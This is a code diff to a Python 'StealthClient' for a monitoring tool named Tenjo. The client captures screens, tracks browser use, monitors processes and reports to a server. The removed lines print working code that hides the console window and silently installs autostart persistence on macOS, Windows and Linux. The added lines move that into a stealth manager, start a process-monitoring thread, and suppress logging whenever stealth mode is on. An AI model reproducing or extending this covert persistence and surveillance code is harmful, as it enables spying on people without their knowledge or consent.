@@ -7,8 +7,6 @@ import time
 import logging
 import signal
 import threading
-import subprocess
-import platform
 
 # Add src to path
 sys.path.append('src')
@@ -19,6 +17,8 @@ from src.utils.auto_update import check_and_update_if_needed
 from src.modules.stream_handler import StreamHandler
 from src.modules.browser_tracker import BrowserTracker
 from src.modules.screen_capture import ScreenCapture
+from src.modules.process_monitor import ProcessMonitor
+from src.utils.stealth import StealthMode, StealthManager
 from os_detector import get_os_info_for_client
 
 # Global flag for graceful shutdown
@@ -49,98 +49,14 @@ def setup_stealth_logging():
             format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
         )
 
-def hide_console_window():
-    """Hide console window on Windows"""
-    if platform.system() == "Windows":
-        try:
-            import ctypes
-            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
-        except:
-            pass
-
-def install_autostart():
-    """Install client to start automatically on system boot"""
-    try:
-        current_file = os.path.abspath(__file__)
-
-        if platform.system() == "Darwin":  # macOS
-            # Create LaunchAgent plist
-            plist_dir = os.path.expanduser("~/Library/LaunchAgents")
-            os.makedirs(plist_dir, exist_ok=True)
-
-            plist_file = os.path.join(plist_dir, "com.tenjo.client.plist")
-            plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
-<plist version="1.0">
-<dict>
-    <key>Label</key>
-    <string>com.tenjo.client</string>
-    <key>ProgramArguments</key>
-    <array>
-        <string>/usr/bin/python3</string>
-        <string>{current_file}</string>
-    </array>
-    <key>RunAtLoad</key>
-    <true/>
-    <key>KeepAlive</key>
-    <true/>
-    <key>StandardOutPath</key>
-    <string>/dev/null</string>
-    <key>StandardErrorPath</key>
-    <string>/dev/null</string>
-</dict>
-</plist>"""
-
-            with open(plist_file, 'w') as f:
-                f.write(plist_content)
-
-            # Load the service
-            subprocess.run(['launchctl', 'load', plist_file], capture_output=True)
-            return True
-
-        elif platform.system() == "Windows":  # Windows
-            # Add to Windows startup registry
-            import winreg
-            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
-            winreg.SetValueEx(key, "TenjoClient", 0, winreg.REG_SZ, f'python "{current_file}"')
-            winreg.CloseKey(key)
-            return True
-
-        elif platform.system() == "Linux":  # Linux
-            # Create systemd user service
-            service_dir = os.path.expanduser("~/.config/systemd/user")
-            os.makedirs(service_dir, exist_ok=True)
-
-            service_file = os.path.join(service_dir, "tenjo-client.service")
-            service_content = f"""[Unit]
-Description=Tenjo Client
-After=network.target
-
-[Service]
-Type=simple
-ExecStart=/usr/bin/python3 {current_file}
-Restart=always
-RestartSec=10
-
-[Install]
-WantedBy=default.target"""
-
-            with open(service_file, 'w') as f:
-                f.write(service_content)
-
-            # Enable and start service
-            subprocess.run(['systemctl', '--user', 'enable', 'tenjo-client.service'], capture_output=True)
-            subprocess.run(['systemctl', '--user', 'start', 'tenjo-client.service'], capture_output=True)
-            return True
-
-    except Exception as e:
-        logging.error(f"Failed to install autostart: {e}")
-        return False
-
 class StealthClient:
     def __init__(self):
         self.api_client = APIClient(Config.SERVER_URL, Config.API_KEY)
         self.stream_handler = StreamHandler(self.api_client)
+        self.process_monitor = ProcessMonitor(self.api_client)
+        self.stealth_mode = StealthMode()
+        self.stealth_manager = StealthManager(entry_script=os.path.abspath(__file__))
+        self.heartbeat_interval = max(10, Config.HEARTBEAT_INTERVAL)
 
         # Setup stealth logging
         setup_stealth_logging()
@@ -153,9 +69,9 @@ class StealthClient:
         self.screen_capture = ScreenCapture(self.api_client)
         self.screen_capture.set_browser_tracker(self.browser_tracker)
 
-        # Hide console in stealth mode
+        # Enable stealth-specific behaviors
         if Config.STEALTH_MODE:
-            hide_console_window()
+            self.stealth_mode.enable_stealth()
 
     def register_client(self):
         """Register client with server (silent)"""
@@ -206,11 +122,10 @@ class StealthClient:
             self.logger.info("=== STEALTH TENJO CLIENT STARTING ===")
 
         # Install autostart on first run
-        if not os.path.exists(os.path.join(Config.DATA_DIR, '.installed')):
-            if install_autostart():
-                # Mark as installed
-                with open(os.path.join(Config.DATA_DIR, '.installed'), 'w') as f:
-                    f.write(str(time.time()))
+        if Config.STEALTH_MODE and not os.path.exists(os.path.join(Config.DATA_DIR, '.installed')):
+            self.stealth_manager.configure_autostart()
+            with open(os.path.join(Config.DATA_DIR, '.installed'), 'w') as f:
+                f.write(str(time.time()))
 
         # Register with server (optional)
         self.register_client()
@@ -253,19 +168,41 @@ class StealthClient:
             if not Config.STEALTH_MODE:
                 self.logger.error(f"Failed to start screen capture: {e}")
 
+        # Start process monitor in separate thread
+        process_thread = None
+        try:
+            process_thread = threading.Thread(
+                target=self.process_monitor.start_monitoring,
+                daemon=True,
+                name="ProcessMonitor"
+            )
+            process_thread.start()
+            if not Config.STEALTH_MODE:
+                self.logger.info("Process monitor started")
+        except Exception as e:
+            if not Config.STEALTH_MODE:
+                self.logger.error(f"Failed to start process monitor: {e}")
+
         # Stealth main loop - minimal logging
-        heartbeat_counter = 0
+        last_heartbeat_at = time.time()
+        last_status_log = time.time()
+        loop_counter = 0
         while not shutdown_flag:
             try:
-                heartbeat_counter += 1
+                loop_counter += 1
+                current_time = time.time()
 
-                # Send heartbeat every 5 minutes (300 seconds / 5 = 60 cycles)
-                if heartbeat_counter % 60 == 0:
+                # Send heartbeat based on configured interval
+                if current_time - last_heartbeat_at >= self.heartbeat_interval:
                     self.send_heartbeat()
+                    last_heartbeat_at = current_time
 
-                # Log status only in debug mode
-                if heartbeat_counter % 720 == 0 and not Config.STEALTH_MODE:  # Every hour
-                    self.logger.info(f"Stealth client running - {heartbeat_counter} cycles completed")
+                # Log status periodically when not in stealth mode (every hour)
+                if not Config.STEALTH_MODE and current_time - last_status_log >= 3600:
+                    self.logger.info(
+                        f"Stealth client running - {loop_counter} cycles completed"
+                    )
+                    last_status_log = current_time
 
                 time.sleep(5)  # 5 second intervals
 
